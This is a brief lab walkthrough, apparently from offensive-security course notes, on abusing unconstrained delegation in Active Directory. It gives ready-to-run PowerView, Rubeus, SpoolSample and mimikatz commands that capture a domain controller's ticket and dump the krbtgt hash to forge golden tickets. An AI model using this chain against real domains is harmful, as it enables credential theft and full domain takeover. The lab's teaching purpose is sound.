**THEORY:**

The DC stores the information about computers configured with unconstrained delegation. This information is available to all domain authenticated users. The information is stored in the [useraccountcontrol](https://learn.microsoft.com/en-US/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties) property as "TRUSTED_FOR_DELEGATION"(represented in its numerical value 524288).

The *useraccountcontrol* property can also be set to a service account rather than a machine account. This can occur if the application is running in the context of the service account.

**IMPORTANT NOTE:** ALL THIS HAVE TO BE PERFORMED FROM A POWERSHELL SESSION

In this lab, the APPSRV01 computer is configured with unconstrained delegation. It has the *useraccountcontrol* property set to "TRUSTED_FOR_DELEGATION". 

1st Enumeration with PowerView
	
 ```Get-DomainComputer -Unconstrained```

2nd Monitoring with Rubeus for a TGT of the CDC01$ computer account
	
```Rubeus.exe monitor /interval:5 /filteruser:CDC01$```

3rd Coerce authentication with SpoolSample of CDC01 to APPSRV01
	
 ```SpoolSample.exe CDC01 APPSRV01```

 (We recieve a TGT using SpoolSample because APPSRV01 is configured with unconstrained delegation, otherwise we would only recieve the CDC01 access token. Which unless we have the "SeImpersonatePrivilege" we cannot use to spawn a new process.)
	
4th The import the recieved TGT with Rubeus
	
 ```Rubeus.exe ptt /ticket:doIFIjCCBR6gAwIBBaEDAgEWo...```

5th(mimikatz) Since CDC01$ is not a local administrator account on the domain controller we cannot perform direct lateral movement. Instead we will perform dcsync(since APPSRV01 has domain replication permissions) to dump the krbtgt NTLM hash to create golden tikcets
	
 ```lsadump::dcsync /domain:contoso.com /user:contoso\krbtgt```
